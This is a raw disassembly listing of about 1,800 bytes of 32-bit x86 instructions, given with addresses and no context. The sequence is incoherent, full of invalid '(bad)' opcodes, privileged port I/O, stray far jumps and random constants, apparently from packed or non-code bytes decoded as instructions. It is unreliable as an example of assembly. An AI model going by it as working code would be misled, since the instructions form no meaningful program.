  41b015:	xchg   DWORD PTR [edi],edx
  41b017:	or     BYTE PTR ds:[ecx-0x69],cl
  41b01b:	pop    esi
  41b01c:	int3   
  41b01d:	out    dx,eax
  41b01e:	loopne 0x41b090
  41b020:	adc    bl,BYTE PTR [ecx+0x79814e9c]
  41b026:	xlat   BYTE PTR ds:[ebx]
  41b027:	mov    dx,0xb5c1
  41b02b:	icebp  
  41b02c:	shr    DWORD PTR [eax+0x71],cl
  41b02f:	test   al,0xe
  41b031:	icebp  
  41b032:	fs inc edx
  41b034:	mov    dh,0x57
  41b036:	pop    esp
  41b037:	inc    ebx
  41b038:	repz mov al,cs:0x87f34298
  41b03f:	jge    0x41b00e
  41b041:	jle    0x41afe8
  41b043:	xchg   ebx,eax
  41b044:	sub    bh,BYTE PTR [ecx]
  41b046:	sbb    BYTE PTR [esi+0x6026fca0],bh
  41b04c:	(bad)  
  41b04d:	cwde   
  41b04e:	nop
  41b04f:	(bad)  
  41b050:	sub    ecx,DWORD PTR [ebx]
  41b052:	loop   0x41b043
  41b054:	jmp    0x25de:0x102eb7e9
  41b05b:	mov    cl,cl
  41b05d:	fldenv [ebx]
  41b05f:	or     edx,DWORD PTR [eax+edx*1-0x12]
  41b063:	or     al,BYTE PTR [ecx-0x6bb67cd]
  41b069:	ins    BYTE PTR es:[edi],dx
  41b06a:	adc    DWORD PTR [eax-0x23],esp
  41b06d:	sbb    al,0xed
  41b06f:	arpl   WORD PTR [edx+0x8],dx
  41b072:	add    DWORD PTR [ebp-0x63],0xffffff99
  41b076:	mov    edx,DWORD PTR [ebp+ebp*8+0x38]
  41b07a:	xlat   BYTE PTR ds:[ebx]
  41b07b:	ret    
  41b07c:	stos   DWORD PTR es:[edi],eax
  41b07d:	mov    ds,edx
  41b07f:	sar    DWORD PTR [esi+ebp*1],0xe8
  41b083:	das    
  41b084:	xchg   edx,eax
  41b085:	shl    BYTE PTR [ebp-0x3d554d35],0x0
  41b08c:	in     eax,dx
  41b08d:	shrd   DWORD PTR [ebx-0x78],ebx,cl
  41b091:	inc    ebx
  41b092:	xor    al,0x6c
  41b094:	jns    0x41b0cd
  41b096:	ret    0xa2e1
  41b099:	sbb    DWORD PTR [esi+0x38],eax
  41b09c:	ins    BYTE PTR es:[edi],dx
  41b09d:	nop
  41b09e:	cmp    ah,BYTE PTR [ebx+ebp*4]
  41b0a1:	stos   BYTE PTR es:[edi],al
  41b0a2:	jo     0x41b0d9
  41b0a4:	sub    cl,dh
  41b0a6:	push   ebp
  41b0a7:	outs   dx,DWORD PTR ds:[esi]
  41b0a8:	push   ebp
  41b0a9:	mov    ebx,0x65dc9563
  41b0ae:	dec    edx
  41b0af:	rol    BYTE PTR [ebp+0x7e],cl
  41b0b2:	dec    esi
  41b0b3:	jno    0x41b04b
  41b0b5:	mov    eax,ds:0xccd25c6b
  41b0ba:	lods   eax,DWORD PTR ds:[esi]
  41b0bb:	fsub   st,st(7)
  41b0bd:	loop   0x41b113
  41b0bf:	mov    edi,0xe7eccd39
  41b0c4:	mov    ebx,0x295536dc
  41b0c9:	dec    edx
  41b0ca:	(bad)  
  41b0cb:	aad    0x8d
  41b0cd:	adc    ebx,ebp
  41b0cf:	std    
  41b0d0:	jbe    0x41b0cf
  41b0d2:	xor    al,0x84
  41b0d4:	mov    eax,ds:0xe280dcc8
  41b0d9:	das    
  41b0da:	not    ebp
  41b0dc:	int    0x72
  41b0de:	cs push ebx
  41b0e0:	mov    cl,0x5f
  41b0e2:	pop    bp
  41b0e4:	dec    ebx
  41b0e5:	into   
  41b0e6:	out    dx,eax
  41b0e7:	and    al,0x48
  41b0e9:	(bad)  
  41b0ea:	push   DWORD PTR [esi+0x160b38ea]
  41b0f0:	xor    ah,BYTE PTR [edx-0x46]
  41b0f3:	scas   al,BYTE PTR es:[edi]
  41b0f4:	popf   
  41b0f5:	pop    ds
  41b0f6:	pop    edx
  41b0f7:	popa   
  41b0f8:	mov    dh,0xa9
  41b0fa:	jp     0x41b159
  41b0fc:	repnz sti 
  41b0fe:	xlat   BYTE PTR ds:[ebx]
  41b0ff:	inc    ecx
  41b100:	push   ecx
  41b101:	imul   ebx,DWORD PTR [esp+eax*2+0x50b00219],0x70
  41b109:	adc    eax,0xdaf49dcc
  41b10e:	or     edx,DWORD PTR [esi+0x23]
  41b111:	aad    0xa4
  41b113:	or     al,0xa9
  41b115:	jg     0x41b10a
  41b117:	adc    BYTE PTR [esi+edi*8+0x42],al
  41b11b:	fsubr  QWORD PTR [edx+0x60]
  41b11e:	inc    ebx
  41b11f:	pop    es
  41b120:	jno    0x41b151
  41b122:	repnz arpl bx,bx
  41b125:	lds    esi,FWORD PTR [esi]
  41b127:	sbb    DWORD PTR es:[ebp+0x40a6bfed],ecx
  41b12e:	mov    BYTE PTR [edi+0x22f6b1cd],dh
  41b134:	fmul   st,st(0)
  41b136:	mov    esi,0x8a315f1e
  41b13b:	(bad)  
  41b13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b13d:	mov    ecx,0x40c02acc
  41b142:	adc    BYTE PTR [eax],cl
  41b144:	ror    bh,cl
  41b146:	aam    0x5
  41b148:	mov    edx,0xd6bf718
  41b14d:	rcl    BYTE PTR [ecx],cl
  41b14f:	sub    ch,bl
  41b151:	mov    bl,0xb3
  41b153:	imul   ecx,eax,0xffffffb0
  41b156:	mov    edx,DWORD PTR [edx+0x6006e907]
  41b15c:	cmp    eax,DWORD PTR [edi-0x5816c4c]
  41b162:	arpl   WORD PTR [ebp+0x121803de],ax
  41b168:	mov    eax,ds:0xf556e3c6
  41b16d:	aas    
  41b16e:	pop    ebp
  41b16f:	xchg   edi,eax
  41b170:	mov    dh,0x1c
  41b172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b173:	xchg   DWORD PTR [ebp-0x541a7b2a],esi
  41b179:	mov    eax,ds:0xea4cf55f
  41b17e:	stc    
  41b17f:	dec    edi
  41b180:	jl     0x41b1f1
  41b182:	test   eax,0x2f3b72ac
  41b187:	dec    esp
  41b188:	jne    0x41b123
  41b18a:	pop    esp
  41b18b:	inc    ebp
  41b18c:	xchg   BYTE PTR [ecx-0xc],al
  41b18f:	fwait
  41b190:	pop    ebp
  41b191:	sub    DWORD PTR [esi],esi
  41b193:	lods   eax,DWORD PTR ds:[esi]
  41b194:	dec    ecx
  41b195:	xchg   esi,eax
  41b196:	or     al,BYTE PTR [esi+0x32e3108e]
  41b19c:	add    dl,BYTE PTR [ebx+0xa]
  41b19f:	push   ebp
  41b1a0:	out    dx,eax
  41b1a1:	push   0xffffff9b
  41b1a3:	fsub   DWORD PTR [ebx]
  41b1a5:	fdivrp st(2),st
  41b1a7:	dec    ecx
  41b1a8:	add    BYTE PTR [edi-0x6b4a1a26],ch
  41b1ae:	repz pop eax
  41b1b0:	mov    dl,0x99
  41b1b2:	inc    esp
  41b1b3:	push   edx
  41b1b4:	enter  0xeda3,0x3c
  41b1b8:	push   fs
  41b1ba:	mov    es,WORD PTR [ebp+0x1e65dc3f]
  41b1c0:	mov    ebx,0xf6d3b6d3
  41b1c5:	sub    DWORD PTR [esi+0x19],0xffffffcf
  41b1c9:	sub    ebp,edi
  41b1cb:	dec    esi
  41b1cc:	shl    BYTE PTR [ecx+0x3b],cl
  41b1cf:	sti    
  41b1d0:	jge    0x41b1c1
  41b1d2:	xor    bh,0x60
  41b1d5:	adc    eax,edi
  41b1d7:	mov    ecx,0x87a23bf0
  41b1dc:	imul   ecx,DWORD PTR [ebp-0x24858b4d],0xeddb7b18
  41b1e6:	ss retf 
  41b1e8:	and    DWORD PTR [esi-0x14e0841e],ebx
  41b1ee:	popa   
  41b1ef:	mov    eax,ds:0xae1e30d2
  41b1f4:	std    
  41b1f5:	(bad)  
  41b1f7:	and    edx,DWORD PTR [esp+ebp*4-0x18812fcf]
  41b1fe:	inc    ebx
  41b1ff:	dec    esp
  41b200:	outs   dx,DWORD PTR ds:[esi]
  41b201:	fwait
  41b202:	mov    DWORD PTR [edi-0xc768039],ecx
  41b208:	sub    eax,0xc5a00a74
  41b20d:	(bad)  
  41b20f:	addr16 out dx,eax
  41b211:	aam    0xb9
  41b213:	and    eax,0x91080fb
  41b218:	jbe    0x41b244
  41b21a:	add    al,0x34
  41b21c:	lods   eax,DWORD PTR ds:[esi]
  41b21d:	out    dx,al
  41b21e:	and    BYTE PTR [esp+eiz*4-0x39],bl
  41b222:	xchg   DWORD PTR [ecx],ecx
  41b224:	mov    al,0xc7
  41b226:	aaa    
  41b227:	and    al,0x83
  41b229:	and    ebp,DWORD PTR [esi-0x38]
  41b22c:	pop    ds
  41b22d:	push   ebx
  41b22e:	outs   dx,BYTE PTR ds:[esi]
  41b22f:	mov    esi,0x8a9c37e9
  41b234:	mov    ebp,0xe781a74
  41b239:	inc    ebp
  41b23a:	adc    eax,0xf99e804d
  41b23f:	ret    0xe881
  41b242:	sbb    ebx,ecx
  41b244:	shl    ch,1
  41b246:	add    ebx,DWORD PTR ds:0x98a38ec1
  41b24c:	fiadd  DWORD PTR [ebx]
  41b24e:	ins    DWORD PTR es:[edi],dx
  41b24f:	inc    esi
  41b250:	pop    ecx
  41b251:	rol    BYTE PTR [ecx+0x24331861],1
  41b257:	call   0x1295:0xeca3f97
  41b25e:	clc    
  41b25f:	lock stc 
  41b261:	jg     0x41b264
  41b263:	sti    
  41b264:	pop    esi
  41b265:	js     0x41b244
  41b267:	mov    bl,0x3a
  41b269:	repz arpl WORD PTR [ebx+0x5b],si
  41b26d:	push   cs
  41b26e:	mov    eax,0x48f07008
  41b273:	leave  
  41b274:	jns    0x41b276
  41b276:	cli    
  41b277:	push   ebp
  41b278:	(bad)  
  41b27a:	sbb    edx,DWORD PTR [edi-0x3de02c88]
  41b280:	ins    BYTE PTR es:[edi],dx
  41b281:	aam    0xe2
  41b283:	dec    esi
  41b284:	and    al,0xec
  41b286:	retf   
  41b287:	das    
  41b288:	ja     0x41b286
  41b28a:	mov    bh,0x5a
  41b28c:	jecxz  0x41b262
  41b28e:	es mov esp,0xb45ba0a3
  41b294:	push   0xffffffdc
  41b296:	and    BYTE PTR ss:[ebp-0x7e],cl
  41b29a:	and    ebx,0x5b70b129
  41b2a0:	mov    DWORD PTR [edi-0x57b791b7],eax
  41b2a6:	popf   
  41b2a7:	cdq    
  41b2a8:	call   0xbda30795
  41b2ad:	in     al,dx
  41b2ae:	enter  0xeb81,0xbe
  41b2b2:	push   edi
  41b2b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2b4:	out    0xb8,eax
  41b2b6:	arpl   bx,dx
  41b2b8:	fdiv   st(0),st
  41b2ba:	add    al,0x1e
  41b2bc:	jbe    0x41b2ec
  41b2be:	ss pop ds
  41b2c0:	cmp    edx,ebx
  41b2c2:	lea    edx,[ebp+0x68]
  41b2c5:	mov    BYTE PTR [ebx],cl
  41b2c7:	aam    0xf7
  41b2c9:	test   DWORD PTR [ebp-0x13],0x872d6cf5
  41b2d0:	retf   
  41b2d1:	or     eax,0xce5f4602
  41b2d6:	add    edi,esp
  41b2d8:	sbb    esp,esp
  41b2da:	(bad)  
  41b2db:	and    al,0xb4
  41b2dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2de:	inc    ebx
  41b2df:	pop    ebp
  41b2e0:	add    dl,BYTE PTR [edx-0x78842ff]
  41b2e6:	add    edi,DWORD PTR [ebp-0x45]
  41b2e9:	sub    ch,BYTE PTR [edi+0x60]
  41b2ec:	push   es
  41b2ed:	inc    DWORD PTR [edx-0x7e]
  41b2f0:	mov    ch,0x5f
  41b2f2:	sub    esi,DWORD PTR [edx+0xfce8f8e]
  41b2f8:	std    
  41b2f9:	test   eax,0x6cf86bc
  41b2fe:	xor    dl,dh
  41b300:	inc    ebp
  41b301:	stos   DWORD PTR es:[edi],eax
  41b302:	call   0x86cd:0xbd501475
  41b309:	mov    esi,0x42a51570
  41b30e:	inc    esp
  41b30f:	mov    esp,0xc7f322b
  41b314:	sub    al,0xac
  41b316:	aam    0x62
  41b318:	inc    eax
  41b319:	cmp    bh,BYTE PTR [edi+0x18f4ff4d]
  41b31f:	mov    al,ds:0x805303a
  41b324:	adc    al,0x4d
  41b326:	xchg   ebp,eax
  41b327:	in     eax,dx
  41b328:	pop    eax
  41b329:	(bad)  
  41b32a:	xchg   edi,eax
  41b32b:	push   edx
  41b32c:	mov    ebx,esi
  41b32e:	and    ecx,DWORD PTR [ebp-0x55]
  41b331:	ins    DWORD PTR es:[edi],dx
  41b332:	jl     0x41b371
  41b334:	mov    edi,0x5640c215
  41b339:	add    DWORD PTR [ebx-0x5d],0x6a
  41b33d:	out    dx,eax
  41b33e:	inc    ebx
  41b33f:	push   0xee8462a5
  41b344:	leave  
  41b345:	jmp    0x41b3b5
  41b347:	or     eax,0x82e31245
  41b34c:	popf   
  41b34d:	dec    ecx
  41b34e:	div    DWORD PTR [ebp+0x3d]
  41b351:	adc    DWORD PTR [ecx-0x1f],ebp
  41b354:	pop    eax
  41b355:	adc    DWORD PTR [ebp+0x5c994b97],0xc87e305e
  41b35f:	jge    0x41b2ea
  41b361:	fwait
  41b362:	sbb    BYTE PTR [edi-0x7244a79e],dh
  41b368:	and    eax,0xff1a95fb
  41b36d:	(bad)  
  41b36e:	mov    bl,0x13
  41b370:	aas    
  41b371:	jl     0x41b362
  41b373:	loopne 0x41b34f
  41b375:	add    al,0x81
  41b377:	pop    ss
  41b378:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b37a:	in     al,dx
  41b37b:	dec    esp
  41b37c:	push   ds
  41b37d:	ins    DWORD PTR es:[edi],dx
  41b37e:	loop   0x41b3c8
  41b380:	iret   
  41b381:	pop    esp
  41b382:	dec    eax
  41b383:	dec    esi
  41b384:	lahf   
  41b385:	sub    ebx,DWORD PTR [eax]
  41b387:	out    0x2d,al
  41b389:	xor    bh,BYTE PTR [ebp+0x7ceabfc]
  41b38f:	push   cs
  41b390:	ins    BYTE PTR es:[edi],dx
  41b391:	mov    bh,0x29
  41b393:	cmp    edi,DWORD PTR [esi]
  41b395:	mov    ah,0xfa
  41b397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b399:	je     0x41b3a4
  41b39b:	push   eax
  41b39c:	inc    eax
  41b39d:	mov    ebx,0x60907402
  41b3a2:	test   eax,eax
  41b3a4:	rol    DWORD PTR [esi],0x66
  41b3a7:	pop    eax
  41b3a8:	push   ds
  41b3a9:	das    
  41b3aa:	icebp  
  41b3ab:	adc    eax,edx
  41b3ad:	ret    0x3514
  41b3b0:	retf   
  41b3b1:	iret   
  41b3b2:	mov    ebp,0x8e5ac9e7
  41b3b7:	out    0xfe,eax
  41b3b9:	xchg   ebx,eax
  41b3ba:	pusha  
  41b3bb:	lea    ecx,[ebx]
  41b3bd:	(bad)  
  41b3be:	mov    BYTE PTR [ecx+0x31adf141],dl
  41b3c4:	xchg   edi,eax
  41b3c5:	mov    BYTE PTR [edx-0x54],0x3e
  41b3c9:	mov    ah,0x8b
  41b3cb:	pop    ecx
  41b3cc:	mov    bh,0xda
  41b3ce:	jnp    0x41b41b
  41b3d0:	add    al,0xe2
  41b3d2:	xor    eax,0x729e1765
  41b3d7:	sbb    BYTE PTR [eax+0x1],cl
  41b3da:	add    BYTE PTR ds:0x59dd6c8,cl
  41b3e0:	unpcklps xmm0,xmm2
  41b3e3:	cmp    eax,0x7b72c8ba
  41b3e8:	pmulhw mm7,QWORD PTR [edx]
  41b3eb:	mov    dh,0xc9
  41b3ed:	imul   edx,DWORD PTR [esi],0xf
  41b3f0:	cdq    
  41b3f1:	fsubr  st(3),st
  41b3f3:	sti    
  41b3f4:	sub    ch,BYTE PTR [edx]
  41b3f6:	pusha  
  41b3f7:	mov    DWORD PTR [esi-0x3c],eax
  41b3fa:	adc    ah,BYTE PTR [eax-0x13336a8d]
  41b400:	loop   0x41b3ff
  41b402:	outs   dx,DWORD PTR ds:[esi]
  41b403:	mov    al,0x88
  41b405:	dec    esp
  41b406:	push   ebx
  41b407:	outs   dx,DWORD PTR ds:[esi]
  41b408:	int    0xd0
  41b40a:	and    bl,ch
  41b40c:	mov    DWORD PTR [edi+0x6de768f6],esp
  41b412:	mov    DWORD PTR [ecx+0x2ac90556],ebp
  41b418:	xchg   ebp,eax
  41b419:	js     0x41b432
  41b41b:	sub    edi,ebp
  41b41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b41e:	call   0x6f034c61
  41b423:	sbb    ebx,DWORD PTR [esi+eax*1]
  41b426:	nop
  41b427:	loop   0x41b496
  41b429:	jl     0x41b440
  41b42b:	or     ebp,esi
  41b42d:	and    bh,BYTE PTR [ecx*4+0x2dd2f367]
  41b434:	outs   dx,BYTE PTR ds:[esi]
  41b435:	sbb    DWORD PTR [ebp+0x7c],ecx
  41b438:	ss out 0xf2,eax
  41b43b:	mov    cl,0x77
  41b43d:	stc    
  41b43e:	push   esi
  41b43f:	mov    esp,0xfc65b745
  41b444:	into   
  41b445:	out    dx,al
  41b446:	ins    BYTE PTR es:[edi],dx
  41b447:	mov    cl,0x2c
  41b449:	lods   al,BYTE PTR ds:[esi]
  41b44a:	and    DWORD PTR [ecx+ecx*4-0x26],eax
  41b44e:	arpl   si,dx
  41b450:	cld    
  41b451:	inc    esi
  41b452:	adc    ebp,edx
  41b454:	push   edx
  41b455:	adc    eax,0xb6768b90
  41b45a:	adc    BYTE PTR [esi],bl
  41b45c:	jae    0x41b4ce
  41b45e:	ss mov ebp,0x5aff45fa
  41b464:	xchg   bx,ax
  41b466:	push   ebx
  41b467:	lahf   
  41b468:	pop    edx
  41b469:	test   al,0x8
  41b46b:	xchg   esi,eax
  41b46c:	fs push 0xffffff88
  41b46f:	mov    edx,0x4e576b28
  41b474:	div    DWORD PTR [ecx+0x41]
  41b477:	outs   dx,DWORD PTR ds:[esi]
  41b478:	jo     0x41b4cd
  41b47a:	out    dx,al
  41b47b:	fdivrp st(5),st
  41b47d:	into   
  41b47e:	fild   WORD PTR [ecx-0x274c9aa1]
  41b484:	cld    
  41b485:	fst    DWORD PTR [ecx]
  41b487:	jmp    0x41b4bd
  41b489:	mov    cs,WORD PTR [esi]
  41b48b:	js     0x41b44f
  41b48d:	push   ebx
  41b48e:	aaa    
  41b48f:	mov    ah,0x27
  41b491:	aam    0x3c
  41b493:	not    BYTE PTR [edi+0xb]
  41b496:	das    
  41b497:	add    al,0xb6
  41b499:	add    DWORD PTR [ebx],0xae2608d0
  41b49f:	in     eax,dx
  41b4a0:	sahf   
  41b4a1:	rcr    ah,cl
  41b4a3:	sbb    DWORD PTR [edx+0x2e],edx
  41b4a6:	sti    
  41b4a7:	xchg   edi,eax
  41b4a8:	gs pusha 
  41b4aa:	sahf   
  41b4ab:	(bad)  
  41b4ac:	push   esp
  41b4ad:	retf   0xca7d
  41b4b0:	add    BYTE PTR [ebp+edi*8-0x4b],ah
  41b4b4:	lds    eax,FWORD PTR [ecx]
  41b4b6:	pop    ds
  41b4b7:	jmp    0xca7:0x46da29
  41b4be:	addr16 mov ds:0xc76d,al
  41b4c2:	jmp    FWORD PTR ds:0x25054328
  41b4c8:	aam    0x6b
  41b4ca:	retf   
  41b4cb:	je     0x41b4cb
  41b4cd:	or     bh,BYTE PTR [ecx+0x66270085]
  41b4d3:	mov    edx,esp
  41b4d5:	lea    edi,[edx+0x6e]
  41b4d8:	mov    cl,0xfc
  41b4da:	cmp    al,0xd6
  41b4dc:	mov    dh,0x8d
  41b4de:	and    al,0x5c
  41b4e0:	or     DWORD PTR [esi+eax*1],esp
  41b4e3:	or     eax,0xb38419b5
  41b4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4e9:	mov    ah,0xd1
  41b4eb:	mov    esi,0xe242ec42
  41b4f0:	xor    DWORD PTR [ebx-0x3f],ebx
  41b4f3:	ins    DWORD PTR es:[edi],dx
  41b4f4:	popf   
  41b4f5:	mul    BYTE PTR [eax]
  41b4f7:	push   esp
  41b4f8:	mov    BYTE PTR [eax-0x74f320ea],0x5e
  41b4ff:	jne    0x41b4ed
  41b501:	call   0xda74dfd4
  41b506:	xor    BYTE PTR [edx*1+0x6746e158],0x22
  41b50e:	jp     0x41b4e0
  41b510:	inc    ecx
  41b511:	aam    0xf7
  41b513:	loop   0x41b536
  41b515:	ds scas al,BYTE PTR es:[edi]
  41b517:	mov    esp,0x56583230
  41b51c:	lods   eax,DWORD PTR ds:[esi]
  41b51d:	rcr    DWORD PTR gs:[ebx+0x5c],1
  41b521:	mov    edx,0x31ab6639
  41b526:	mov    bh,0xb4
  41b528:	ins    DWORD PTR es:[edi],dx
  41b529:	sub    bl,bh
  41b52b:	aam    0x8d
  41b52d:	sub    BYTE PTR [ebp-0x6d],ah
  41b530:	add    edi,DWORD PTR [ebp+0x31]
  41b533:	arpl   dx,ax
  41b535:	das    
  41b536:	dec    ebx
  41b537:	ror    DWORD PTR [edx+0x6d909835],1
  41b53d:	mov    dl,0xec
  41b53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b540:	push   edx
  41b541:	out    dx,eax
  41b542:	mov    ch,0x9b
  41b544:	push   0xa6f5b5e
  41b549:	mov    ds:0x2d9531f5,eax
  41b54e:	stos   DWORD PTR es:[edi],eax
  41b54f:	xor    al,BYTE PTR [esi+0x20]
  41b552:	stos   BYTE PTR es:[edi],al
  41b553:	inc    esp
  41b554:	(bad)  
  41b555:	into   
  41b556:	cmc    
  41b557:	retf   
  41b558:	nop
  41b559:	xor    eax,0x3fcf35aa
  41b55e:	icebp  
  41b55f:	fwait
  41b560:	int    0xf2
  41b562:	xchg   ebp,eax
  41b563:	add    BYTE PTR gs:[ecx],ch
  41b566:	lock or al,0x88
  41b569:	es (bad) 
  41b56b:	add    al,bh
  41b56d:	(bad)  
  41b56e:	xlat   BYTE PTR ds:[ebx]
  41b56f:	inc    ecx
  41b570:	test   BYTE PTR [edi-0x2a],dl
  41b573:	aam    0x3c
  41b575:	jns    0x41b5ca
  41b577:	push   esp
  41b578:	xchg   dl,dl
  41b57a:	pop    edi
  41b57b:	cmc    
  41b57c:	mov    ds:0x135e8738,eax
  41b581:	sbb    edx,DWORD PTR [ebp-0x50]
  41b584:	in     eax,0x97
  41b586:	es mov edi,0xd4d0997d
  41b58c:	gs mov ebp,0xf99db051
  41b592:	loope  0x41b530
  41b594:	in     al,dx
  41b595:	sbb    eax,DWORD PTR [eax+0x26]
  41b598:	pop    ds
  41b599:	mov    edx,0x4c23a60f
  41b59e:	in     eax,dx
  41b59f:	scas   al,BYTE PTR es:[edi]
  41b5a0:	and    eax,0x46cdef22
  41b5a5:	sbb    esi,0x70
  41b5a8:	ror    DWORD PTR [edi+0x1ec431ab],1
  41b5ae:	icebp  
  41b5af:	das    
  41b5b0:	cs jne 0x41b631
  41b5b3:	sub    DWORD PTR [esi+0x4d],0xa6475705
  41b5ba:	les    edx,FWORD PTR [ebx]
  41b5bc:	pop    es
  41b5bd:	iret   
  41b5be:	inc    esi
  41b5bf:	fmul   st,st(0)
  41b5c1:	loopne 0x41b5a3
  41b5c3:	scas   eax,DWORD PTR es:[edi]
  41b5c4:	scas   al,BYTE PTR es:[edi]
  41b5c5:	pop    ds
  41b5c6:	inc    ebx
  41b5c7:	inc    edx
  41b5c8:	shl    BYTE PTR [edx+0x21],cl
  41b5cb:	mov    ecx,0x96bf4e15
  41b5d0:	call   0x8652798e
  41b5d5:	(bad)  
  41b5d6:	fwait
  41b5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5d8:	xor    edx,ebx
  41b5da:	shr    BYTE PTR [ebp+0x28261c4b],0xe8
  41b5e1:	pop    esi
  41b5e2:	inc    edi
  41b5e3:	jmp    0x41b5b8
  41b5e5:	xor    esi,ecx
  41b5e7:	test   BYTE PTR [edx-0x2f],bh
  41b5ea:	aaa    
  41b5eb:	push   es
  41b5ec:	and    BYTE PTR [edx],0x82
  41b5ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f0:	loop   0x41b66e
  41b5f2:	lahf   
  41b5f3:	fsub   DWORD PTR [edx]
  41b5f5:	adc    al,0x10
  41b5f7:	jo     0x41b590
  41b5f9:	mov    bh,0xa
  41b5fb:	sub    ecx,DWORD PTR [esi-0x380e2286]
  41b601:	in     al,dx
  41b602:	pushf  
  41b603:	mov    al,ch
  41b605:	into   
  41b606:	dec    ebx
  41b607:	add    eax,DWORD PTR [edx+0x534b249f]
  41b60d:	pop    es
  41b60e:	rcl    BYTE PTR [ecx],cl
  41b610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b611:	cmp    al,0x44
  41b613:	xchg   esi,eax
  41b614:	shr    dl,0x7b
  41b617:	test   BYTE PTR [eax-0x1c],ah
  41b61a:	in     eax,dx
  41b61b:	std    
  41b61c:	mov    ecx,0x29300420
  41b621:	jmp    0x41b63b
  41b623:	xchg   al,ah
  41b625:	fnstenv [eax-0x19]
  41b628:	add    eax,0x5c917fe0
  41b62d:	jge    0x41b650
  41b62f:	out    dx,al
  41b630:	icebp  
  41b631:	cmp    BYTE PTR [ebx-0x1e],0xa6
  41b635:	test   edi,esp
  41b637:	add    ebx,DWORD PTR [esi]
  41b639:	add    eax,0x409d66fc
  41b63e:	sub    dh,dl
  41b640:	pop    ebx
  41b641:	int    0xae
  41b643:	jbe    0x41b5c5
  41b645:	push   ds
  41b646:	push   esp
  41b647:	stos   BYTE PTR es:[edi],al
  41b648:	xor    edx,DWORD PTR [esi+edi*4-0x3e74a847]
  41b64f:	hlt    
  41b650:	and    bh,ch
  41b652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b653:	repz and BYTE PTR [eax],ah
  41b656:	xor    DWORD PTR [esi-0x2b],esi
  41b659:	dec    ebp
  41b65a:	gs xchg edx,eax
  41b65c:	inc    ecx
  41b65d:	ja     0x41b5f7
  41b65f:	popf   
  41b660:	inc    ebp
  41b661:	xlat   BYTE PTR ds:[ebx]
  41b662:	test   DWORD PTR [edi],ebp
  41b664:	into   
  41b665:	daa    
  41b666:	sub    DWORD PTR [edx-0x7d],esp
  41b669:	pop    ecx
  41b66a:	lock cmp BYTE PTR [ebx-0x55],0xd
  41b66f:	push   eax
  41b670:	icebp  
  41b671:	rcr    DWORD PTR [esi+0x2ed8da5e],0xe5
  41b678:	mov    ebx,DWORD PTR [ebp-0x2f770f0c]
  41b67e:	mov    eax,ebx
  41b680:	jo     0x41b691
  41b682:	and    ebp,DWORD PTR [edi-0x56]
  41b685:	repz ret 
  41b687:	push   cs
  41b688:	inc    esp
  41b689:	repnz mov cl,BYTE PTR [eax+0x5e]
  41b68d:	ins    BYTE PTR es:[edi],dx
  41b68e:	or     DWORD PTR [edx],ebp
  41b690:	xchg   edi,eax
  41b691:	jbe    0x41b659
  41b693:	sub    ebx,DWORD PTR [ecx+0xc]
  41b696:	or     al,0xe
  41b698:	mov    ebp,0x4f468fbc
  41b69d:	lods   eax,DWORD PTR ds:[esi]
  41b69e:	mov    edx,0xb090a57e
  41b6a3:	adc    DWORD PTR [edi],ecx
  41b6a5:	rcl    DWORD PTR [ebx+0x2f],0x58
  41b6a9:	pop    ss
  41b6aa:	pop    ebp
  41b6ab:	xchg   esp,eax
  41b6ac:	inc    esi
  41b6ad:	push   esi
  41b6ae:	mov    WORD PTR [ebx],ss
  41b6b0:	xchg   ebp,eax
  41b6b1:	les    ecx,FWORD PTR [eax-0x42]
  41b6b4:	jae    0x41b687
  41b6b6:	inc    edi
  41b6b7:	iret   
  41b6b8:	enter  0x7f85,0x81
  41b6bc:	sbb    esp,edi
  41b6be:	pop    esp
  41b6bf:	xrelease xchg BYTE PTR [edi+0x4707c7c8],ah
  41b6c6:	aad    0xcd
  41b6c8:	icebp  
  41b6c9:	mov    cl,0xdd
  41b6cb:	push   ecx
  41b6cc:	leave  
  41b6cd:	pop    ds
  41b6ce:	adc    eax,0x14dc6d46
  41b6d3:	and    BYTE PTR [edx],0x5b
  41b6d6:	inc    ecx
  41b6d7:	push   ebx
  41b6d8:	and    eax,0xd6f5bccd
  41b6dd:	xchg   esi,eax
  41b6de:	adc    BYTE PTR [ecx+0x36],cl
  41b6e1:	(bad)  
  41b6e2:	out    dx,al
  41b6e3:	into   
  41b6e4:	out    0xda,al
  41b6e6:	aas    
  41b6e7:	or     BYTE PTR [edi],al
  41b6e9:	xchg   edx,eax
  41b6ea:	aam    0x73
  41b6ec:	mov    esi,0x65805bab
  41b6f1:	sub    eax,0x33c27df4
  41b6f6:	jb     0x41b6ae
  41b6f8:	pop    eax
  41b6f9:	pop    eax
  41b6fa:	or     eax,0xad5e9aa9
  41b6ff:	cwde   
  41b700:	inc    esp
  41b701:	icebp  
  41b702:	not    BYTE PTR [ebp+0x18]
  41b705:	sub    al,0x1f
  41b707:	xor    eax,0x806f1577
  41b70c:	hlt    
  41b70d:	inc    edi
  41b70e:	add    al,0x84
  41b710:	push   edi
  41b711:	(bad)  
  41b712:	pushf  
  41b713:	je     0x41b786
  41b715:	aam    0xa2
  41b717:	mov    edx,0x27289d80
  41b71c:	adc    BYTE PTR [edi],cl
  41b71e:	test   edx,esp
  41b720:	jnp    0x41b737
  41b722:	test   eax,0xf4f68375
  41b727:	cmp    bl,BYTE PTR ds:0xf8f66547
  41b72d:	cmp    DWORD PTR [eax-0x3e],esi
  41b730:	xor    edx,0xc75c3e8d
  41b736:	call   0xf90c23bf
  41b73b:	dec    ecx
  41b73c:	push   esp
  41b73d:	inc    ebx
  41b73e:	xchg   DWORD PTR [ecx+0x2f],ebp
